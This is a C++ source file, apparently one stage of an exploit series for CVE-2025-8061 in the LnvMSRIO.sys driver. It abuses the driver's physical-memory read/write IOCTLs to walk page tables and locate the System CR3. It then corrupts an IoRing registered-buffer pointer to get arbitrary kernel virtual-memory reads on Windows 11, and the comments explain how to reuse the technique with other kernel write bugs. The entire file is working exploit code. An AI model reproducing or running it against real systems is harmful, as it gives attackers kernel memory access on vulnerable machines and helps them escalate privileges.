/*
 * 07_ioring.cpp  —  CVE-2025-8061 (LnvMSRIO.sys) — IORing RegBuffers Corruption
 *
 * Platform: Windows 11 22H2+ (IORING_VERSION_3)
 *
 * Technique: IORING_OBJECT.RegBuffers VA overwrite → arbitrary virtual R/W
 * ───────────────────────────────────────────────────────────────────────────
 * IoRings (NtCreateIoRing) let user mode queue async file I/O without repeated
 * syscalls.  When a user buffer is registered with BuildIoRingRegisterBuffers,
 * the kernel pins the pages (via MDL) and stores a kernel-mode mapping VA in
 * the IORING_OBJECT:
 *
 *   IORING_OBJECT.RegBuffers[i].MappedSystemVa  →  kernel VA of pinned buffer
 *   IORING_OBJECT.RegBuffers[i].Length          →  buffer size
 *
 * When the kernel executes an IORING_OP_WRITE_FILE with buffer index i, it
 * reads Length bytes from MappedSystemVa and writes them to the target file.
 * It does NOT re-validate MappedSystemVa after registration.
 *
 * ┌─────────────────────────────────────────────────────────────────┐
 * │  READ  arb kernel VA k:                                         │
 * │    overwrite RegBuffers[i].MappedSystemVa = k                   │
 * │    BuildIoRingWriteFile(tempFile, bufIdx=i, len=N)              │
 * │    SubmitIoRing → kernel reads N bytes from k → writes to file  │
 * │    ReadFile(tempFile) → N bytes of arbitrary kernel memory      │
 * └─────────────────────────────────────────────────────────────────┘
 *
 * Why IORing matters as a standalone technique:
 *   If your only primitive is a kernel object field write (UAF, pool overflow,
 *   arbitrary ptr write), overwriting MappedSystemVa converts that to a full
 *   arbitrary-virtual-read without needing page-table walks or physical I/O.
 *   Here we use LnvMSRIO for the field overwrite, but the IORing channel does
 *   the actual kernel VA read entirely through normal usermode I/O.
 *
 * Finding IORING_OBJECT without scanning:
 *   NtQuerySystemInformation(0x10 = SystemHandleInformation) returns every
 *   kernel object pointer for every open handle in the system.  Filtering by
 *   our PID + our HIORING's internal handle gives IORING_OBJECT VA directly —
 *   no KASLR defeat loop, no physical scan.
 *
 * IORING_OBJECT layout (Win11 22H2+ — from public research):
 *   Not exported; we locate the RegBuffers entry at runtime by scanning the
 *   object for a kernel pointer followed by our known buffer size.
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 07_ioring.cpp /link kernel32.lib
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <algorithm>
using std::min;

// ─── Device ──────────────────────────────────────────────────────────────────

#define DEVICE_NAME      L"\\\\.\\WinMsrDev"
#define IOCTL_PHYS_READ  0x9c406104u
#define IOCTL_PHYS_WRITE 0x9c40a108u

static HANDLE g_dev = INVALID_HANDLE_VALUE;

static bool OpenDevice()
{
    g_dev = CreateFileW(DEVICE_NAME,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile: %lu\n", GetLastError()); return false;
    }
    printf("[+] Device opened  handle=%p\n", g_dev);
    return true;
}

// ─── Physical R/W ────────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct PhysReadIn   { UINT64 PA; DWORD AS; DWORD Count; };
struct PhysWriteIn8 { UINT64 PA; DWORD OT; DWORD AS; UINT64 Data; };
#pragma pack(pop)

static bool PhysRead(uint64_t pa, void *buf, DWORD len)
{
    if (!len || len > 4096) return false;
    PhysReadIn in = { pa, 1, len };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), buf, len, &got, nullptr)
           && got == len;
}

static bool PhysReadU64(uint64_t pa, uint64_t *out)
{
    PhysReadIn in = { pa, 8, 1 };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), out, 8, &got, nullptr)
           && got == 8;
}

static bool PhysWriteU64(uint64_t pa, uint64_t val)
{
    PhysWriteIn8 in = { pa, 1, 8, val };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                           &in, sizeof(in), nullptr, 0, &got, nullptr) != FALSE;
}

// ─── Page table walk ──────────────────────────────────────────────────────────

static uint64_t VaToPa(uint64_t cr3, uint64_t va)
{
    uint64_t pml4 = cr3 & ~0xFFFULL;
    auto idx = [&](int s){ return (va >> s) & 0x1FF; };
    uint64_t e = 0;
    if (!PhysReadU64(pml4 + idx(39)*8, &e) || !(e&1)) return 0;
    uint64_t p = e & 0x000FFFFFFFFFF000ULL;
    if (!PhysReadU64(p + idx(30)*8, &e) || !(e&1)) return 0;
    if (e & 0x80) return (e & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);
    p = e & 0x000FFFFFFFFFF000ULL;
    if (!PhysReadU64(p + idx(21)*8, &e) || !(e&1)) return 0;
    if (e & 0x80) return (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL);
    p = e & 0x000FFFFFFFFFF000ULL;
    if (!PhysReadU64(p + idx(12)*8, &e) || !(e&1)) return 0;
    return (e & 0x000FFFFFFFFFF000ULL) | (va & 0xFFFULL);
}

// ─── Kernel VA read (multi-page) ─────────────────────────────────────────────

static bool KernelRead(uint64_t cr3, uint64_t va, void *buf, DWORD len)
{
    auto *dst = (uint8_t*)buf;
    while (len > 0) {
        uint64_t pa = VaToPa(cr3, va & ~0xFFFULL);
        if (!pa) return false;
        DWORD off  = (DWORD)(va & 0xFFF);
        DWORD chunk = min(len, 0x1000u - off);
        if (!PhysRead(pa + off, dst, chunk)) return false;
        va += chunk; dst += chunk; len -= chunk;
    }
    return true;
}


// ─── Physical memory range enumeration (VMware-safe) ─────────────────────────
// Reads valid RAM extents from the Windows kernel's physical memory resource
// map so we never request MmMapIoSpace() on VMware device MMIO pages.
// HKLM\HARDWARE\RESOURCEMAP\System Resources\Physical Memory\.Translated
// is a CM_RESOURCE_LIST with CmResourceTypeMemory (Type=8) entries.
//
// CM_PARTIAL_RESOURCE_DESCRIPTOR on x64:
//   +0   BYTE  Type
//   +1   BYTE  ShareDisposition
//   +2   WORD  Flags
//   +4   LARGE_INTEGER Start    (8 bytes)
//   +12  ULONG Length           (4 bytes)
//   +16  (padding to 20-byte record)

struct PhRange { uint64_t base, size; };

static int GetPhysRanges(PhRange *out, int cap)
{
    HKEY hKey = nullptr;
    const char *kpath =
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory";
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, kpath, 0, KEY_READ, &hKey)
            != ERROR_SUCCESS)
        return 0;

    DWORD type = 0, cb = 0;
    RegQueryValueExA(hKey, ".Translated", nullptr, &type, nullptr, &cb);
    if (!cb) { RegCloseKey(hKey); return 0; }

    auto *rbuf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cb + 8);
    if (!rbuf) { RegCloseKey(hKey); return 0; }
    if (RegQueryValueExA(hKey, ".Translated", nullptr, &type, rbuf, &cb)
            != ERROR_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, rbuf);
        RegCloseKey(hKey);
        return 0;
    }
    RegCloseKey(hKey);

    int n = 0;
    DWORD off = 0;
    if (off + 4 <= cb) {
        DWORD lcnt = *(DWORD*)(rbuf + off); off += 4;
        for (DWORD l = 0; l < lcnt && off + 16 <= cb; l++) {
            off += 8;               // InterfaceType(4) + BusNumber(4)
            off += 4;               // Version(2) + Revision(2)
            if (off + 4 > cb) break;
            DWORD dcnt = *(DWORD*)(rbuf + off); off += 4;
            for (DWORD d = 0; d < dcnt && off + 20 <= cb; d++, off += 20) {
                if (rbuf[off] != 8) continue;   // CmResourceTypeMemory = 8
                LARGE_INTEGER st = {};
                st.LowPart  = *(DWORD*)(rbuf + off + 4);
                st.HighPart = *(LONG*) (rbuf + off + 8);
                ULONG len   = *(DWORD*)(rbuf + off + 12);
                if (n < cap) {
                    out[n].base = (uint64_t)st.QuadPart;
                    out[n].size = (uint64_t)len;
                    n++;
                }
            }
        }
    }
    HeapFree(GetProcessHeap(), 0, rbuf);
    return n;
}

static uint64_t GetSystemCR3()
{
    PhRange ranges[32];
    int n = GetPhysRanges(ranges, 32);
    if (n == 0) {
        // Fallback: use actual installed RAM with NO extra buffer
        MEMORYSTATUSEX ms = { sizeof(ms) };
        GlobalMemoryStatusEx(&ms);
        ranges[0].base = 0x100000;
        ranges[0].size = 0x07F00000;  // [1 MB, 128 MB) — System EPROCESS always here
        n = 1;
    }
    auto *buf = (uint8_t*)VirtualAlloc(nullptr, 1<<20, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 0;
    uint64_t cr3 = 0;
    for (int ri = 0; ri < n && !cr3; ri++) {
        uint64_t rbase = ranges[ri].base;
        uint64_t rend  = ranges[ri].base + ranges[ri].size;
        if (rbase < 0x100000) rbase = 0x100000;
        rbase = (rbase + 0xFFFFF) & ~(uint64_t)0xFFFFF;  // align up to 1 MB
        for (uint64_t pa = rbase; pa < rend && !cr3; pa += 1<<20) {
            bool any_ok = false;
            for (DWORD pg = 0; pg < (1u<<20); pg += 0x1000) {
                if (PhysRead(pa+pg, buf+pg, 0x1000)) any_ok = true;
                else memset(buf+pg, 0, 0x1000);
            }
            if (!any_ok) continue;
            for (DWORD off = 0; off + 0x5B8 <= (1u<<20); off += 8) {
                if (*(ULONG_PTR*)(buf+off+0x440) != 4) continue;
                if (_strnicmp((char*)(buf+off+0x5A8), "System", 6) != 0) continue;
                uint64_t c = *(uint64_t*)(buf+off+0x028);
                if (c && !(c & 0xFFF)) { cr3 = c; break; }
            }
        }
    }
    VirtualFree(buf, 0, MEM_RELEASE);
    return cr3;
}

// ─── NtQuerySystemInformation helpers ────────────────────────────────────────

typedef LONG (NTAPI *pfnNtQSI)(ULONG, PVOID, ULONG, PULONG);
static pfnNtQSI g_NtQSI = nullptr;

// SystemHandleInformation (class 0x10)
struct SYS_HANDLE_ENTRY {
    USHORT Pid;
    USHORT CreatorIndex;
    UCHAR  TypeIndex;
    UCHAR  Attrs;
    USHORT Handle;
    PVOID  Object;   // ← kernel object pointer
    ULONG  Access;
};
struct SYS_HANDLE_INFO { ULONG Count; SYS_HANDLE_ENTRY Entries[1]; };

// Returns kernel object VA for our handle, or 0 on failure.
static uint64_t HandleToObjectVa(HANDLE h)
{
    ULONG sz = 1 << 18;
    auto *buf = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz);
    while (g_NtQSI(0x10, buf, sz, &sz) == (LONG)0xC0000004)
        buf = (uint8_t*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf, sz *= 2);

    auto *info = (SYS_HANDLE_INFO*)buf;
    DWORD my_pid = GetCurrentProcessId();
    USHORT hval  = (USHORT)(ULONG_PTR)h;
    uint64_t obj = 0;
    for (ULONG i = 0; i < info->Count; i++) {
        if (info->Entries[i].Pid == (USHORT)my_pid &&
            info->Entries[i].Handle == hval) {
            obj = (uint64_t)(uintptr_t)info->Entries[i].Object;
            break;
        }
    }
    HeapFree(GetProcessHeap(), 0, buf);
    return obj;
}

// ntoskrnl base + size via SystemModuleInformation (class 11)
static uint64_t GetNtoskrnlBase()
{
    ULONG sz = 1 << 18;
    auto *buf = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz);
    while (g_NtQSI(11, buf, sz, &sz) == (LONG)0xC0000004)
        buf = (uint8_t*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf, sz *= 2);
    struct MOD { HANDLE sec; PVOID mb, ib; ULONG sz, fl, loi, ioi, lc, oft; char path[256]; };
    ULONG n = *(ULONG*)buf;
    auto *m = (MOD*)(buf + sizeof(ULONG));
    uint64_t base = n ? (uint64_t)(uintptr_t)m[0].ib : 0;
    HeapFree(GetProcessHeap(), 0, buf);
    return base;
}

// ─── IoRing types (self-contained — no <ioringapi.h> needed) ─────────────────

typedef void* HIORING;
typedef enum { IORING_VERSION_1=1, IORING_VERSION_2, IORING_VERSION_3 } IORING_VERSION;
typedef enum { IORING_CREATE_ADVISORY_FLAGS_NONE=0 } IORING_CREATE_ADVISORY_FLAGS;
typedef enum { IORING_CREATE_REQUIRED_FLAGS_NONE=0 } IORING_CREATE_REQUIRED_FLAGS;
struct IORING_CREATE_FLAGS {
    IORING_CREATE_ADVISORY_FLAGS Advisory;
    IORING_CREATE_REQUIRED_FLAGS Required;
};
typedef enum { IORING_REF_RAW=0, IORING_REF_REGISTERED=1 } IORING_REF_KIND;
struct IORING_REGISTERED_BUFFER { UINT32 BufferIndex; UINT32 Offset; };
struct IORING_BUFFER_REF {
    IORING_REF_KIND Kind;
    union { IORING_REGISTERED_BUFFER Registered; PVOID Address; };
};
struct IORING_BUFFER_INFO { PVOID Address; SIZE_T Length; };
typedef enum { IORING_HANDLE_REF_RAW=0, IORING_HANDLE_REF_REGISTERED=1 } IORING_HANDLE_KIND;
struct IORING_HANDLE_REF {
    IORING_HANDLE_KIND Kind;
    union { HANDLE Handle; UINT32 Index; };
};
// FILE_WRITE_FLAGS already defined in winbase.h (SDK 26100+)
typedef enum { IORING_SQE_FLAGS_NONE=0 } IORING_SQE_FLAGS;
struct IORING_CQE {
    ULONG_PTR UserData;
    HRESULT   ResultCode;
    ULONG_PTR Information;
};

// ─── IoRing API loader ────────────────────────────────────────────────────────

typedef HRESULT (WINAPI *pfnCreateIoRing)   (IORING_VERSION, IORING_CREATE_FLAGS, UINT32, UINT32, HIORING*);
typedef HRESULT (WINAPI *pfnBuildRegBufs)   (HIORING, UINT32, const IORING_BUFFER_INFO*, ULONG_PTR);
typedef HRESULT (WINAPI *pfnSubmitIoRing)   (HIORING, UINT32, DWORD, PUINT32);
typedef HRESULT (WINAPI *pfnBuildWriteFile) (HIORING, IORING_HANDLE_REF, IORING_BUFFER_REF, UINT32, UINT64, FILE_WRITE_FLAGS, ULONG_PTR, IORING_SQE_FLAGS);
typedef HRESULT (WINAPI *pfnPopCqe)         (HIORING, IORING_CQE*);
typedef HRESULT (WINAPI *pfnCloseIoRing)    (HIORING);

static pfnCreateIoRing    IoRingCreate;
static pfnBuildRegBufs    IoRingRegBufs;
static pfnSubmitIoRing    IoRingSubmit;
static pfnBuildWriteFile  IoRingWriteFile;
static pfnPopCqe          IoRingPop;
static pfnCloseIoRing     IoRingClose;

static bool LoadIoRingApis()
{
    HMODULE kb = GetModuleHandleA("KernelBase.dll");
    if (!kb) kb = LoadLibraryA("KernelBase.dll");
    if (!kb) { printf("[-] KernelBase.dll not found\n"); return false; }

#define LOAD(sym, var) \
    var = (decltype(var))GetProcAddress(kb, sym); \
    if (!var) { printf("[-] %s not found — need Win11 22H2+\n", sym); return false; }

    LOAD("CreateIoRing",              IoRingCreate)
    LOAD("BuildIoRingRegisterBuffers",IoRingRegBufs)
    LOAD("SubmitIoRing",              IoRingSubmit)
    LOAD("BuildIoRingWriteFile",      IoRingWriteFile)
    LOAD("PopIoRingCompletion",       IoRingPop)
    LOAD("CloseIoRing",               IoRingClose)
#undef LOAD
    return true;
}

// ─── HIORING internal layout (Win11 22H2+ — from public research) ─────────────
//
// The opaque HIORING pointer actually points to a user-mode struct:
//   +0x000  HANDLE hKernel        — NT handle to IORING_OBJECT in kernel
//   +0x008  DWORD  Version
//   +0x010  PVOID  RegBuffersUser — user-mode registered-buffer list (unused here)
//   +0x018  UINT32 RegBufferCount
//   +0x020  PVOID  RegFilesUser
//   +0x028  UINT32 RegFileCount
//   +0x030  PVOID  SqRingBase     — user-mode VA of SQ shared ring
//   +0x038  UINT64 SqRingSize
//   ...
// We read hKernel at +0x00 to use HandleToObjectVa().

static HANDLE GetIoRingKernelHandle(HIORING h)
{
    return *(HANDLE*)h;  // first field is the kernel handle
}

// ─── Find RegBuffers[0] entry in IORING_OBJECT ────────────────────────────────
//
// Kernel IORING_OBJECT contains (Win11 22H2+, offset approx 0x080):
//   RegBuffers: Ptr64 → array of Ptr64 → NT_IORING_BUFFER_REG {
//     +0x000  LIST_ENTRY  (16 bytes)
//     +0x010  MappedSystemVa  Ptr64   ← overwrite this
//     +0x018  Length          SIZE_T
//     +0x020  Mdl             Ptr64
//   }
//
// We don't hardcode the offset.  Instead we scan the first 0x200 bytes of
// IORING_OBJECT for a kernel pointer P such that:
//   PhysRead(VaToPa(P + 0x10)) == some kernel VA
//   PhysRead(VaToPa(P + 0x18)) == buf_size   ← our registered buffer size
//
// This finds the RegBuffers array pointer, then dereferences RegBuffers[0].

struct RegBufInfo {
    uint64_t entry_va;         // VA of NT_IORING_BUFFER_REG
    uint64_t mapped_va;        // current MappedSystemVa value
    uint64_t mapped_va_pa;     // PA of the MappedSystemVa field
    uint64_t length;           // registered length
};

static bool FindRegBufEntry(uint64_t cr3, uint64_t ioring_va,
                             SIZE_T buf_size, RegBufInfo *out)
{
    uint8_t obj_dump[0x200] = {};
    if (!KernelRead(cr3, ioring_va, obj_dump, sizeof(obj_dump))) {
        printf("[-] KernelRead(IORING_OBJECT) failed\n"); return false;
    }

    // Scan for a candidate pointer to a RegBuffers array (array of Ptr64)
    for (int off = 0; off + 8 <= (int)sizeof(obj_dump); off += 8) {
        uint64_t cand = *(uint64_t*)(obj_dump + off);
        if ((cand >> 48) != 0xFFFF) continue;   // must be kernel VA
        if (cand & 0x7) continue;               // 8-byte aligned

        // Try treating cand as RegBuffers[0] (direct struct pointer)
        // NT_IORING_BUFFER_REG: [+0x00 LIST_ENTRY(16)] [+0x10 MappedVA] [+0x18 Length]
        uint64_t mv = 0, len = 0;
        if (!KernelRead(cr3, cand + 0x10, &mv, 8)) continue;
        if (!KernelRead(cr3, cand + 0x18, &len, 8)) continue;

        if ((mv >> 48) == 0xFFFF && len == (uint64_t)buf_size) {
            printf("    [scan +0x%03X] found entry  VA=0x%016llX  mapped=0x%016llX  len=0x%llX\n",
                   off, cand, mv, len);
            out->entry_va     = cand;
            out->mapped_va    = mv;
            out->mapped_va_pa = VaToPa(cr3, cand + 0x10);
            out->length       = len;
            return true;
        }

        // Try treating cand as pointer-to-array (RegBuffers = ptr to ptr[])
        // i.e., *(cand) is the actual entry pointer
        uint64_t entry_ptr = 0;
        if (!KernelRead(cr3, cand, &entry_ptr, 8)) continue;
        if ((entry_ptr >> 48) != 0xFFFF || (entry_ptr & 7)) continue;

        uint64_t mv2 = 0, len2 = 0;
        if (!KernelRead(cr3, entry_ptr + 0x10, &mv2, 8)) continue;
        if (!KernelRead(cr3, entry_ptr + 0x18, &len2, 8)) continue;

        if ((mv2 >> 48) == 0xFFFF && len2 == (uint64_t)buf_size) {
            printf("    [scan +0x%03X] found entry via ptr-of-ptr  VA=0x%016llX  mapped=0x%016llX  len=0x%llX\n",
                   off, entry_ptr, mv2, len2);
            out->entry_va     = entry_ptr;
            out->mapped_va    = mv2;
            out->mapped_va_pa = VaToPa(cr3, entry_ptr + 0x10);
            out->length       = len2;
            return true;
        }
    }
    return false;
}

// ─── Verify: KernelRead from MappedSystemVa matches user buffer ───────────────

static bool VerifyMappedVa(uint64_t cr3, uint64_t mapped_va,
                            const uint8_t *user_buf, DWORD check_len)
{
    uint8_t kern_buf[64] = {};
    check_len = min(check_len, (DWORD)sizeof(kern_buf));
    if (!KernelRead(cr3, mapped_va, kern_buf, check_len)) return false;
    return memcmp(kern_buf, user_buf, check_len) == 0;
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main()
{
    printf("=== CVE-2025-8061 | LnvMSRIO.sys | 07 - IORing RegBuffers Corruption ===\n\n");

    // ── Check Win11 ───────────────────────────────────────────────────────────
    OSVERSIONINFOEXW ovi = { sizeof(ovi) };
    // RtlGetVersion bypasses the compat shim that GetVersionEx uses
    auto RtlGetVer = (LONG(NTAPI*)(OSVERSIONINFOEXW*))
        GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");
    if (RtlGetVer) RtlGetVer(&ovi);
    printf("[*] Windows %lu.%lu build %lu\n",
           ovi.dwMajorVersion, ovi.dwMinorVersion, ovi.dwBuildNumber);
    if (ovi.dwBuildNumber < 22621) {
        printf("[!] IORing registered buffers require Win11 22H2 (build 22621+)\n");
        printf("    Earlier builds lack IORING_VERSION_3 — aborting.\n");
        return 1;
    }

    // ── Load IoRing APIs ──────────────────────────────────────────────────────
    if (!LoadIoRingApis()) return 1;
    printf("[+] IoRing APIs loaded\n\n");

    // ── Load ntdll NtQuerySystemInformation ───────────────────────────────────
    g_NtQSI = (pfnNtQSI)GetProcAddress(GetModuleHandleA("ntdll"),
                                        "NtQuerySystemInformation");
    if (!g_NtQSI) { printf("[-] NtQSI not found\n"); return 1; }

    if (!OpenDevice()) return 1;

    // ── Step 1: allocate user buffer with sentinel ────────────────────────────
    const SIZE_T BUF_SIZE = 0x1000;
    const uint64_t SENTINEL = 0xDEADC0DEBEEF1337ULL;
    auto *user_buf = (uint8_t*)VirtualAlloc(nullptr, BUF_SIZE,
                                             MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!user_buf) { printf("[-] VirtualAlloc: %lu\n", GetLastError()); return 1; }
    for (SIZE_T i = 0; i + 8 <= BUF_SIZE; i += 8)
        *(uint64_t*)(user_buf + i) = SENTINEL;
    printf("[+] User buffer  VA=0x%016llX  size=0x%llX  filled with sentinel 0x%016llX\n\n",
           (uint64_t)(uintptr_t)user_buf, (uint64_t)BUF_SIZE, SENTINEL);

    // ── Step 2: create IoRing ─────────────────────────────────────────────────
    HIORING ring = nullptr;
    IORING_CREATE_FLAGS cf = { IORING_CREATE_ADVISORY_FLAGS_NONE,
                                IORING_CREATE_REQUIRED_FLAGS_NONE };
    HRESULT hr = IoRingCreate(IORING_VERSION_3, cf, 64, 64, &ring);
    if (FAILED(hr)) {
        printf("[-] CreateIoRing: 0x%08X\n", (unsigned)hr); return 1;
    }
    HANDLE hKernel = GetIoRingKernelHandle(ring);
    printf("[+] IoRing created  HIORING=%p  kernel handle=0x%p\n\n", ring, hKernel);

    // ── Step 3: register the user buffer ─────────────────────────────────────
    IORING_BUFFER_INFO buf_info = { user_buf, BUF_SIZE };
    hr = IoRingRegBufs(ring, 1, &buf_info, 0);
    if (FAILED(hr)) { printf("[-] BuildIoRingRegisterBuffers: 0x%08X\n", (unsigned)hr); return 1; }

    UINT32 submitted = 0;
    hr = IoRingSubmit(ring, 1, INFINITE, &submitted);
    if (FAILED(hr)) { printf("[-] SubmitIoRing(register): 0x%08X\n", (unsigned)hr); return 1; }
    printf("[+] Buffer registered (submitted=%u)\n\n", submitted);

    // ── Step 4: find IORING_OBJECT kernel VA ──────────────────────────────────
    printf("[*] Looking up IORING_OBJECT VA via NtQuerySystemInformation(0x10)...\n");
    uint64_t ioring_va = HandleToObjectVa(hKernel);
    if (!ioring_va) { printf("[-] IORING_OBJECT not found in handle table\n"); return 1; }
    printf("[+] IORING_OBJECT VA = 0x%016llX\n\n", ioring_va);

    // ── Step 5: get System CR3 ────────────────────────────────────────────────
    printf("[*] Getting System CR3...\n");
    uint64_t cr3 = GetSystemCR3();
    if (!cr3) { printf("[-] CR3 not found\n"); return 1; }
    printf("[+] System CR3 = 0x%016llX\n\n", cr3);

    // ── Step 6: scan IORING_OBJECT for RegBuffers entry ──────────────────────
    printf("[*] Scanning IORING_OBJECT (0x200 bytes) for RegBuffers[0]...\n");
    RegBufInfo entry = {};
    if (!FindRegBufEntry(cr3, ioring_va, BUF_SIZE, &entry)) {
        printf("[-] RegBuffers[0] not found — IORING_OBJECT layout may differ on this build\n");
        IoRingClose(ring); CloseHandle(g_dev); return 1;
    }

    printf("\n[+] RegBuffers[0] found:\n");
    printf("    entry_va       = 0x%016llX\n",   entry.entry_va);
    printf("    MappedSystemVa = 0x%016llX\n",   entry.mapped_va);
    printf("    MappedVa PA    = 0x%016llX\n",   entry.mapped_va_pa);
    printf("    Length         = 0x%llX\n\n",    entry.length);

    // ── Step 7: verify MappedSystemVa == our user buffer content ─────────────
    printf("[*] Verifying MappedSystemVa via KernelRead...\n");
    if (!VerifyMappedVa(cr3, entry.mapped_va, user_buf, 8)) {
        printf("[-] Verification failed — MappedSystemVa does not match user buffer\n");
        printf("    (may be a different mapping VA; continuing anyway)\n");
    } else {
        printf("[+] Verified: KernelRead(MappedSystemVa) == sentinel pattern\n");
        printf("    kernel sees our user buffer through the pinned mapping\n");
    }

    // ── Step 8: get ntoskrnl base ─────────────────────────────────────────────
    printf("\n[*] Getting ntoskrnl base...\n");
    uint64_t nt_base = GetNtoskrnlBase();
    if (!nt_base) { printf("[-] ntoskrnl base not found\n"); return 1; }
    printf("[+] ntoskrnl base = 0x%016llX\n", nt_base);

    // Verify ntoskrnl is readable via KernelRead
    uint8_t mz_check[4] = {};
    KernelRead(cr3, nt_base, mz_check, 4);
    printf("    ntoskrnl[0..3] via KernelRead = %02X %02X %02X %02X  (%s)\n\n",
           mz_check[0], mz_check[1], mz_check[2], mz_check[3],
           (mz_check[0]=='M' && mz_check[1]=='Z') ? "MZ OK" : "unexpected");

    // ── Step 9: open temp file for write ─────────────────────────────────────
    char tmp_path[MAX_PATH] = {};
    char tmp_dir[MAX_PATH]  = {};
    GetTempPathA(MAX_PATH, tmp_dir);
    GetTempFileNameA(tmp_dir, "ior", 0, tmp_path);
    HANDLE hFile = CreateFileA(tmp_path,
                                GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile(temp): %lu\n", GetLastError()); return 1;
    }
    printf("[+] Temp file: %s\n\n", tmp_path);

    // ── Step 10: overwrite MappedSystemVa → ntoskrnl_base ────────────────────
    printf("[*] Overwriting RegBuffers[0].MappedSystemVa → ntoskrnl_base...\n");
    printf("    Before: MappedSystemVa = 0x%016llX\n", entry.mapped_va);
    if (!PhysWriteU64(entry.mapped_va_pa, nt_base)) {
        printf("[-] PhysWriteU64 failed: %lu\n", GetLastError()); return 1;
    }

    // Readback to confirm
    uint64_t rb = 0;
    PhysReadU64(entry.mapped_va_pa, &rb);
    printf("    After:  MappedSystemVa = 0x%016llX  %s\n\n",
           rb, rb == nt_base ? "[overwritten ✓]" : "[MISMATCH]");
    if (rb != nt_base) { printf("[-] Overwrite did not stick\n"); return 1; }

    // ── Step 11: submit IORING_OP_WRITE_FILE via corrupted buffer ────────────
    //
    // The kernel will read 4 bytes from RegBuffers[0].MappedSystemVa (= ntoskrnl_base)
    // and write them to hFile at offset 0.
    //
    // This is the IORing read-kernel-memory primitive:
    //   MappedSystemVa → arbitrary kernel VA → its bytes appear in the file.

    printf("[*] Queuing IORING_OP_WRITE_FILE (buf_index=0, len=4, offset=0)...\n");

    IORING_HANDLE_REF fref = { IORING_HANDLE_REF_RAW, { hFile } };
    IORING_BUFFER_REF bref = {};
    bref.Kind = IORING_REF_REGISTERED;
    bref.Registered.BufferIndex = 0;
    bref.Registered.Offset      = 0;

    hr = IoRingWriteFile(ring, fref, bref, 4, 0,
                         FILE_WRITE_FLAGS_NONE, 0xCAFE, IORING_SQE_FLAGS_NONE);
    if (FAILED(hr)) {
        printf("[-] BuildIoRingWriteFile: 0x%08X\n", (unsigned)hr);
        // Restore before exit
        PhysWriteU64(entry.mapped_va_pa, entry.mapped_va);
        return 1;
    }

    UINT32 sub2 = 0;
    hr = IoRingSubmit(ring, 1, 5000 /*ms timeout*/, &sub2);
    printf("    SubmitIoRing = 0x%08X  submitted=%u\n", (unsigned)hr, sub2);

    // Drain completion queue
    IORING_CQE cqe = {};
    while (IoRingPop(ring, &cqe) == S_OK) {
        printf("    CQE: userData=0x%llX  result=0x%08X  info=%llu\n",
               (uint64_t)cqe.UserData, (unsigned)cqe.ResultCode,
               (uint64_t)cqe.Information);
    }

    // ── Step 12: read result from file ────────────────────────────────────────
    SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
    uint8_t file_bytes[4] = {};
    DWORD got = 0;
    ReadFile(hFile, file_bytes, 4, &got, nullptr);

    printf("\n[*] File content after IORING write (read %lu bytes):\n", got);
    printf("    %02X %02X %02X %02X\n",
           file_bytes[0], file_bytes[1], file_bytes[2], file_bytes[3]);

    bool success = (got == 4) && (file_bytes[0] == 'M') && (file_bytes[1] == 'Z');
    if (success)
        printf("\n[+] MZ header confirmed — IORing read ntoskrnl kernel memory via corrupted RegBuffer!\n");
    else if (got == 4)
        printf("\n[!] Got 4 bytes but not MZ — ntoskrnl image might be remapped; check the bytes.\n");
    else
        printf("\n[-] Write may not have completed or file has 0 bytes.\n");

    // ── Step 13: RESTORE MappedSystemVa ──────────────────────────────────────
    printf("\n[*] Restoring RegBuffers[0].MappedSystemVa...\n");
    PhysWriteU64(entry.mapped_va_pa, entry.mapped_va);
    uint64_t rb2 = 0;
    PhysReadU64(entry.mapped_va_pa, &rb2);
    printf("    Restored: 0x%016llX  %s\n",
           rb2, rb2 == entry.mapped_va ? "[OK ✓]" : "[MISMATCH — close process ASAP]");

    // ── Cleanup ───────────────────────────────────────────────────────────────
    CloseHandle(hFile);
    DeleteFileA(tmp_path);
    IoRingClose(ring);
    VirtualFree(user_buf, 0, MEM_RELEASE);
    CloseHandle(g_dev);

    printf("\n[+] Done.\n");
    return success ? 0 : 1;
}
